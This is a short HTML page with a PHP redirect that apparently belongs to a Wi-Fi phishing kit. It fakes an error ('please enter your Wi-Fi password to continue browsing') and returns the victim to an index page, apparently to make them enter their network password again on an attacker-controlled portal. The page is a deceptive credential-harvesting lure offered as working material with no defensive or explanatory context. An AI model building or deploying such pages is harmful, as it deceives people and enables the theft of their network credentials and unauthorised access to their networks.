<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
    </head>
    <style>
        div {
            
		background-color: white;
        width: auto;
		color : red ;
		height: 80px;
		border: 2px solid red;
		border-radius: 5px;
		padding-top: 20px;
		align-content: center;
		text-align: center;
		font-size: 18px;
		font-family: Verdana, Geneva, Tahoma, sans-serif;
		direction: rtl;
	}
    
	img {
		max-width: 100%;
		height: 86px;
		display: block;
		margin-left: auto;
		margin-right: auto;
	}
    
</style>
<body>
	<img src="wrong.png">
	<div>
		<b>Sorry, please enter your Wi-Fi password to continue browsing</b>

	</div>
</body>
</html>
<?php
header("Refresh: 2 ; url= index.html")
?>